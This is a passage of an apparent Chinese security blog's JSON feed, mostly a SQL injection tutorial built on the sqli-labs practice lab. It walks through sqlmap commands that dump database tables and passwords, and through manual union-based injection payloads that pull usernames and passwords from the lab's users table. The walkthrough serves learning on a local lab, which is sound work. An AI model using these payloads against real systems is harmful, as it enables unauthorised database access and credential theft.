class=\"keyword\">exit</span>(<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;iconv&#x27;</span>) ? <span class=\"title function_ invoke__\">iconv</span>(<span class=\"string\">&#x27;UTF-8&#x27;</span>, <span class=\"string\">&#x27;GBK&#x27;</span>, <span class=\"string\">&#x27;文件格式校验不正确&#x27;</span>) : <span class=\"string\">&#x27;The document format verification is not correct&#x27;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 解压文件</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">extract</span>(PCLZIP_OPT_PATH, <span class=\"variable\">$dir</span>, PCLZIP_OPT_REPLACE_NEWER) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            @<span class=\"title function_ invoke__\">dr_dir_delete</span>(<span class=\"variable\">$dir</span>);</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"variable language_\">$this</span>-&gt;pclzip-&gt;<span class=\"title function_ invoke__\">zip</span>(<span class=\"literal\">true</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        @<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"title function_ invoke__\">is_file</span>(<span class=\"variable\">$dir</span>.<span class=\"string\">&#x27;45x45.jpg&#x27;</span>) || !<span class=\"title function_ invoke__\">is_file</span>(<span class=\"variable\">$dir</span>.<span class=\"string\">&#x27;90x90.jpg&#x27;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">&#x27;文件创建失败&#x27;</span>);</span><br><span class=\"line\">        &#125;  </span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "File upload"
            ]
        },
        {
            "id": "http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2022/03/16/SQL%E6%B3%A8%E5%85%A5/",
            "title": "SQL injection",
            "date_published": "2022-03-16T05:38:45.000Z",
            "content_html": "<h1 id=\"sql注入\"><a class=\"markdownIt-Anchor\" href=\"#sql注入\">#</a> SQL 注入</h1>\n<h3 id=\"1sqli-labs-master-安装\"><a class=\"markdownIt-Anchor\" href=\"#1sqli-labs-master-安装\">#</a> 1.sqli-labs-master 安装</h3>\n<p>下面在 linux 中安装，虚拟机地址为 192.168.1.155，端口号为 18888，使用宝塔面板</p>\n<h4 id=\"1将sqli-labs-master移动到网站根目录下解压\"><a class=\"markdownIt-Anchor\" href=\"#1将sqli-labs-master移动到网站根目录下解压\">#</a> 1. 将 sqli-labs-master 移动到网站根目录下，解压</h4>\n<p><code>unzip sqli-labs-master</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469835321-5363494e-a8b7-4796-99a0-97f475cef370.png\" alt=\"img\"></p>\n<h4 id=\"2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\"><a class=\"markdownIt-Anchor\" href=\"#2修改配置文件配合文件为sqlisql-connectionsdb-credsinc\">#</a> 2. 修改配置文件，配合文件为： <code>sqli/sql-connections/db-creds.inc</code></h4>\n<p><code>vim sqli/sql-connections/db-creds.inc</code></p>\n<p>数据库用户名和密码在宝塔面板中可以修改</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469904204-6c29948a-2cdc-4f11-8e01-58f8ed2dbe83.png\" alt=\"img\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639469999346-dca351bf-b5d0-4a51-9ff1-dab559edf120.png\" alt=\"img\"></p>\n<h4 id=\"3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\"><a class=\"markdownIt-Anchor\" href=\"#3浏览器打开输入对应的文件路径安装数据库如果第二步有错此步将不能正常执行\">#</a> 3. 浏览器打开，输入对应的文件路径，安装数据库，如果第二步有错，此步将不能正常执行</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470033800-7e58d43a-1835-4303-906c-05a0d03dd762.png\" alt=\"img\"></p>\n<h4 id=\"4验证安装完成后即可按到如下界面\"><a class=\"markdownIt-Anchor\" href=\"#4验证安装完成后即可按到如下界面\">#</a> 4. 验证安装完成后，即可按到如下界面</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1639470107086-065656d0-7044-4c09-9323-5e799f726534.png\" alt=\"img\"></p>\n<h3 id=\"2sqlmap-安装与使用\"><a class=\"markdownIt-Anchor\" href=\"#2sqlmap-安装与使用\">#</a> 2.sqlmap 安装与使用</h3>\n<h4 id=\"1kali联网\"><a class=\"markdownIt-Anchor\" href=\"#1kali联网\">#</a> 1.kali 联网</h4>\n<p>选择桥接时，只需要将虚拟机和物理主机 ip 置于一个网段中</p>\n<p>如果不能联网，修改 <code>/etc/network/interfaces</code>   ，设置 ip，网关，掩码</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> /etc/network/interfaces.d/*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># The loopback network interface**</span></span><br><span class=\"line\">auto lo</span><br><span class=\"line\">iface lo inet loopback</span><br><span class=\"line\"></span><br><span class=\"line\">auto eth0</span><br><span class=\"line\"></span><br><span class=\"line\">iface eth0 inet static</span><br><span class=\"line\">address 192.168.0.66</span><br><span class=\"line\">gateway 192.168.1.1</span><br><span class=\"line\">netmask 255.255.254.0</span><br></pre></td></tr></table></figure>\n<h4 id=\"2修改dns-etcresolvconf\"><a class=\"markdownIt-Anchor\" href=\"#2修改dns-etcresolvconf\">#</a> 2. 修改 DNS，  <code>/etc/resolv.conf</code></h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nameserver 8.8.8.8</span><br><span class=\"line\">nameserver 114.114.114.114</span><br><span class=\"line\">search localdomain</span><br></pre></td></tr></table></figure>\n<h4 id=\"3重启网络服务\"><a class=\"markdownIt-Anchor\" href=\"#3重启网络服务\">#</a> 3. 重启网络服务</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/etc/init.d/networking restart</span><br><span class=\"line\"></span><br><span class=\"line\">service networking restart </span><br></pre></td></tr></table></figure>\n<h4 id=\"4sqlmap使用\"><a class=\"markdownIt-Anchor\" href=\"#4sqlmap使用\">#</a> 4.sqlmap 使用</h4>\n<p>下载：Github：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">https://github.com/sqlmapproject/sqlmap</span></p>\n<h4 id=\"5sqlmap支持的注入技术\"><a class=\"markdownIt-Anchor\" href=\"#5sqlmap支持的注入技术\">#</a> 5.SQLMAP 支持的注入技术</h4>\n<p>​\t基于布尔的盲注：根据返回页面判断条件真假的注入。</p>\n<p>​\t基于时间的盲注：不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语 句是否执行（即页面返回时间是否增加）来判断。</p>\n<p>​\t基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>\n<p>​\t基于联合查询的注入：可以使用 UNION 的情况下的注入。</p>\n<p>​\t堆查询注入：同时执行多条语句的注入。</p>\n<h4 id=\"6sqlmap支持的数据库类型\"><a class=\"markdownIt-Anchor\" href=\"#6sqlmap支持的数据库类型\">#</a> 6.SQLMAP 支持的数据库类型</h4>\n<p>​\t主要包括一些关系型数据库（ RMDBS ） ， 如 MySQL 、Oracle 、PostgreSQL 、 Microsoft SQL Server 、Microsoft Access 、IBM DB2 、SQLite 、Firebird 、 Sybase、SAP MaxDB、Informix、HSQLDB 等</p>\n<h4 id=\"7sqlmap用法以下用windows演示\"><a class=\"markdownIt-Anchor\" href=\"#7sqlmap用法以下用windows演示\">#</a> 7.sqlmap 用法 (以下用 Windows 演示)</h4>\n<h4 id=\"71对于get请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#71对于get请求爆破方式\">#</a> 7.1 对于 get 请求爆破方式</h4>\n<p>1.sqlmap -u URL</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span></p>\n<p>判断可注入的参数</p>\n<p>判断可以用哪种 SQL 注入技术来注入</p>\n<p>识别出所有存在的注入类型</p>\n<p>尝试去判定数据库版本、开发语言、操作系统版本</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213182954882.png\" alt=\"image-20220213182954882\"></p>\n<p>2.sqlmap -u URL --current-db 获得数据库名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> --current-db</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183117274.png\" alt=\"image-20220213183117274\"></p>\n<p>3.sqlmap -u URL -D database --tables  获得数据库中表名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security --tables</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183308240.png\" alt=\"image-20220213183308240\"></p>\n<p>4.sqlmap -u URL -D database -T tables --columns 获得表中字段名</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users --columns</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183454058.png\" alt=\"image-20220213183454058\"></p>\n<p>5.sqlmap -u URL -D database -T users -C name1,name2,name3 --dump 获取每个字段中的数据</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> -D security -T users -C password,username --dump</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183651064.png\" alt=\"image-20220213183651064\"></p>\n<h4 id=\"72对于post请求爆破方式\"><a class=\"markdownIt-Anchor\" href=\"#72对于post请求爆破方式\">#</a> 7.2 对于 post 请求爆破方式</h4>\n<p>1. 保存文件方式  sqlmap -r x.txt</p>\n<p>先使用 BurpSuite 抓包，将获取内容保存到指定文件，下面将文件保存到 E://1.txt</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -r E:\\1.txt</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213183936861.png\" alt=\"image-20220213183936861\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184049162.png\" alt=\"\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213184622656.png\" alt=\"image-20220213184622656\"></p>\n<p>2. 手动输入 post 参数方式  sqlmap -u URL --data “”</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --data “uname=admin&amp;passwd=admin&amp;submit=Submit” --current-db</p>\n<p>3. 自动搜索 post 参数方式</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span>  -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xNy9pbmRleC5waHA=\">http://192.168.1.4:18888/sqli/Less-17/index.php</span> --forms</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213185639194.png\" alt=\"image-20220213185639194\"></p>\n<h4 id=\"73对于一些较难注入的场景\"><a class=\"markdownIt-Anchor\" href=\"#73对于一些较难注入的场景\">#</a> 7.3 对于一些较难注入的场景</h4>\n<p>通过指定 level 设置，一共包含五个等级</p>\n<p>level=2 http cookie 会测试</p>\n<p>level=3 http user-agent/referer 头会测试</p>\n<p>level=5 包含的 payload 最多，会自动破解出 cookie、XFF 等头部注入，相对应他的速度也比较慢。</p>\n<p>python <span class=\"exturl\" data-url=\"aHR0cDovL3NxbG1hcC5weQ==\">sqlmap.py</span> -u <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMS40OjE4ODg4L3NxbGkvTGVzcy0xLz9pZD0x\">http://192.168.1.4:18888/sqli/Less-1/?id=1</span> level 5</p>\n<h3 id=\"使用awvs-进行sql-inject扫描\"><a class=\"markdownIt-Anchor\" href=\"#使用awvs-进行sql-inject扫描\">#</a> 使用 AWVS 进行 sql inject 扫描</h3>\n<p>安装过程不在描述，使用 add target 输入要扫描的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305141924499.png\" alt=\"image-20220305141924499\"></p>\n<p>选择扫描速度</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142112656.png\" alt=\"image-20220305142112656\"></p>\n<p>设置 user-agent 伪装</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142142802.png\" alt=\"image-20220305142142802\"></p>\n<p>可以联动被动扫描器如 xray 进行多次扫描，</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142228843.png\" alt=\"image-20220305142228843\"></p>\n<p>选择 scan</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142305286.png\" alt=\"image-20220305142305286\"></p>\n<p>发现 sql 注入，存在盲注</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142353893.png\" alt=\"image-20220305142353893\"></p>\n<p>点击可以查看详细信息和扫描过程</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220305142445896.png\" alt=\"image-20220305142445896\"></p>\n<h3 id=\"3sql注入基础\"><a class=\"markdownIt-Anchor\" href=\"#3sql注入基础\">#</a> 3.SQL 注入基础</h3>\n<h4 id=\"31sql前置知识\"><a class=\"markdownIt-Anchor\" href=\"#31sql前置知识\">#</a> 3.1SQL 前置知识</h4>\n<p>1.mysql 查询方式</p>\n<p>mysql 注入主要关注 MYSQL 系统数据库 <code>information_schema</code> ，关注系统数据库的表 <code>columns</code>  和 <code>schemata</code>  表以及 <code>tables</code>  表</p>\n<p><code>SCHEMATA</code>  表：提供了关于数据库的信息</p>\n<p>desc information_schema.schemata;</p>\n<p>select distinct schema_name from schemata;</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191251636.png\" alt=\"image-20220213191251636\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213191345456.png\" alt=\"image-20220213191345456\"></p>\n<p><code>COLUMNS</code>  表：给出了表中的列信息</p>\n<p>desc information_schema.columns;</p>\n<p>select distinct column_name from information_schema.columns</p>\n<p><code>TABLES</code>  表：给出了关于数据库中的表的信息</p>\n<p>desc information_schema.tables;</p>\n<p>select distinct table_name from information_schema.tables;</p>\n<p><strong>即可以使用的查询语句为</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.select distinct schema_name from schemata; 获取数据库名(或使用函数select database();)</span><br><span class=\"line\"></span><br><span class=\"line\">2.select table_name from information_schema.tables where table_schema=&#x27;security&#x27;; 获取表名</span><br><span class=\"line\"></span><br><span class=\"line\">3.select column_name  from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;;  获取列名</span><br><span class=\"line\"></span><br><span class=\"line\">4.select username from users;  获取数据</span><br></pre></td></tr></table></figure>\n<p>2.mysql 函数</p>\n<p>常用的 mysql 函数有：</p>\n<p><code>user()</code>  用户名</p>\n<p><code>database()</code>  数据库名</p>\n<p><code>version()</code>  mysql 数据库版本</p>\n<p><code>load_file()</code>  mysql 读取本地文件的函数</p>\n<p><code>@@datadir</code>   数据库路径</p>\n<p>3.sql 常用注释</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220213193633629.png\" alt=\"image-20220213193633629\"></p>\n<h4 id=\"32sql注入定义\"><a class=\"markdownIt-Anchor\" href=\"#32sql注入定义\">#</a> 3.2SQL 注入定义</h4>\n<p>SQL Injection：就是通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>\n<p>本质因为输入的数据和代码不进行区分</p>\n<p>成因未对用户提交的参数数据进行校验或有效的过滤，直接进行 SQL 语句的拼接，改变了原有 SQL 语句的语义，传进数据库解析引擎中执行。</p>\n<p>所有的输入只要和数据库进行交互的，都有可能触发 SQL 注入</p>\n<p>常见的包括：</p>\n<p>Get 参数触发 SQL 注入</p>\n<p>POST 参数触发 SQL 注入</p>\n<p>Cookie 触发 SQL 注入</p>\n<p>其他参与 sql 执行的输入都有可能进行 SQL 注入</p>\n<p>两个条件</p>\n<p>用户能够控制输入</p>\n<p>原本程序要执行的 SQL 语句，拼接了用户输入的恶意数据</p>\n<h4 id=\"32mysql注入分类\"><a class=\"markdownIt-Anchor\" href=\"#32mysql注入分类\">#</a> 3.2mysql 注入分类</h4>\n<p>1. 按照请求方法注入</p>\n<p>​\tget 型注入</p>\n<p>​\tpost 型注入</p>\n<p>2. 按照 SQL 数据类型分类</p>\n<p>​\t整形注入</p>\n<p>​\t字符型注入</p>\n<p>3. 其他类型数据类型</p>\n<p>​\t报错注入</p>\n<p>​\t双注入</p>\n<p>​\t布尔盲注</p>\n<p>​\t时间盲注</p>\n<p>​\tCookie 注入</p>\n<p>​\tUser-Agent 注入</p>\n<p><strong>手工注入过程</strong></p>\n<p>1 判断是否存在注入点；</p>\n<p>2 判断字段长度（字段数）；</p>\n<p>3 判断字段回显位置；</p>\n<p>4 判断数据库信息；</p>\n<p>5 查找数据库名；</p>\n<p>6 查找数据库表；</p>\n<p>7 查找数据库表中所有字段以及字段值；</p>\n<p>8 猜解账号密码；</p>\n<p>9 登录管理员后台。</p>\n<h5 id=\"万能密码\"><a class=\"markdownIt-Anchor\" href=\"#万能密码\">#</a> 万能密码</h5>\n<p>select * from users where  username=&quot;&quot; or 1=1 --+</p>\n<p>通过 or 的 1=1 恒为真，密码被注释，此时相当于 select * from users;</p>\n<h5 id=\"整形注入\"><a class=\"markdownIt-Anchor\" href=\"#整形注入\">#</a> 整形注入</h5>\n<p>1. 判断是否由注入 (是否未严格校验)— 第一要素</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可控参数改变 (类似于?id=1,2,3,4) 能否影响页面结果</span><br><span class=\"line\">输入的SQL语句是否能报错，通过数据库报错看到数据库一些语句的痕迹</span><br><span class=\"line\">?id=1&#x27;   报错说明是整形注入 &#x27;</span><br><span class=\"line\">输入的SQL语句能否不报错，语句是否可以成功闭合</span><br><span class=\"line\">information_schema 包含当前数据库表名</span><br><span class=\"line\">tables 数据库中所有表，通过table_schema 和table_name 确定</span><br><span class=\"line\">通过union同时执行两条语句，但需要保证前一个表和后一个表字段数一样</span><br><span class=\"line\">因此需要判断前一个表有几列</span><br><span class=\"line\">通过#或者--+ 将后面的语句注释，使其只执行前面的语句，通过HTML实体编码将其编码#---%23</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3,4 #</span><br><span class=\"line\">如果提示有different columns，说明不匹配，可以使用枚举</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=4 union select 1,2,3 # </span><br><span class=\"line\">这里的1,2,3只是用于占位</span><br><span class=\"line\">将id改为前表不存在的值，使其查询结果不显示前表，同时可以查出回显位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,2,3 # </span><br><span class=\"line\">将后面占位符改为需要查询的语句，同时可以调换位置使其输出在正确的位置</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,user(),3 %23</span><br><span class=\"line\">寻找数据库名字</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,schema_name,3 from information_schema.schemata %23</span><br><span class=\"line\">此时只能查询出一条语句，可以使用group_concat()拼接不同列的数据</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata %23</span><br><span class=\"line\">查询当前数据库</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,database(),3  %23</span><br><span class=\"line\">查询当前数据有有哪些表，可以使用group_concat或concat,使用concat需要使用limit限制每次出数据的个数</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(table,name),3 from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\">查询表有哪些字段</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns  where table_schema = database() and table_name=&#x27;users&#x27; %23</span><br><span class=\"line\">查询用户名密码</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(username),group_concat(password) from security.users %23</span><br><span class=\"line\">以human_read输出user_name和password</span><br><span class=\"line\">http://192.168.1.155/sqli/Less-2/?id=-1 union select 1, group_concat(concat_ws(&#x27;:&#x27;,username,password)),3 from security.users %23</span><br></pre></td></tr></table></figure>\n<p>2. 什么类型注入</p>\n<p>3. 语句是否能够被恶意修改 — 第二要素</p>\n<p>4. 是否能够成功执行 — 第三要素</p>\n<p>5. 获取想要数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.判断是否是整形注入，即加&#x27;判断是否可以闭合&#x27;</span><br><span class=\"line\">2.判断输入是否可以影响输出 ?id=1 and 0  ?id=1 and 1 尝试使其不报错</span><br><span class=\"line\">3.判断表有几列 union select 1,2,3 %23 或者使用order by ，按照第x列排序，可以使用二分法依次查找列数</span><br><span class=\"line\">4.使用?id=1 and 0 union select 1,2,3 %23，其中1,2,3可以用需要查询的信息替换 database()</span><br><span class=\"line\">5.查询表的详细信息?id=1 and 0 union select 1,group_concat(table_name),3  from information_schema.tables where table_schema = database() %23</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>order by 探测列名原理：</strong></p>\n<p><strong>order by 后可以加列名，列号。比如 order by 3，按照第三列排序，因此如果第三列不存在会报错，我们可以利用这点探测列数</strong></p>\n<h5 id=\"字符型注入\"><a class=\"markdownIt-Anchor\" href=\"#字符型注入\">#</a> 字符型注入</h5>\n<p>和数字型区别：接收的参数是否有’’ ,id='<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>i</mi><msup><mi>d</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mtext>字符型，</mtext><mi>i</mi><mi>d</mi><mo>=</mo></mrow><annotation encoding=\"application/x-tex\">id&#x27;字符型，id=</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.751892em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">字</span><span class=\"mord cjk_fallback\">符</span><span class=\"mord cjk_fallback\">型</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span></span></span></span>id 数字型</p>\n<p>也可以通过报错信息查看，如果在 limit 附近报错，说明是数字型，如果在 $id 中报错说明是字符型，因为多了一个’</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.使用order by判断列数</span><br><span class=\"line\">?id=1&#x27; order by 3 --+</span><br><span class=\"line\">2.使用联合查询</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select user()),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:root@localhost</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">3.查找数据库中有几张表</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">提示超出一行</span><br><span class=\"line\">可以使用limit 0,1，此时报出第一张表名</span><br><span class=\"line\">或者使用group_concat</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),(select database()) --+ </span><br><span class=\"line\">Welcome    Dhakkan</span><br><span class=\"line\">Your Login name:emails,referers,uagents,users</span><br><span class=\"line\">Your Password:security</span><br><span class=\"line\"></span><br><span class=\"line\">4.查找列名</span><br><span class=\"line\">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and 